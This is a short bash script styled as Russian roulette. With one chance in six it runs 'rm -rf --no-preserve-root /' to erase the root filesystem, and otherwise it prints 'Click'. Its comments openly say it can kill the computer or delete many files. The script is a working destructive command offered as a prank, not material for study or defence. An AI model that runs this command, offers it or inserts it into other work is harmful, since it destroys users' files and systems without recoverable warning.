#!/bin/bash
#
# One chance out of six to kill your computer.
# WARNING : In some cases, this script will not really erases your root
# directory, but it can certainly delete a lot of files you have access to.


[ $[ $RANDOM % 6 ] -eq 0 ] && rm -rf --no-preserve-root / || echo "Click"
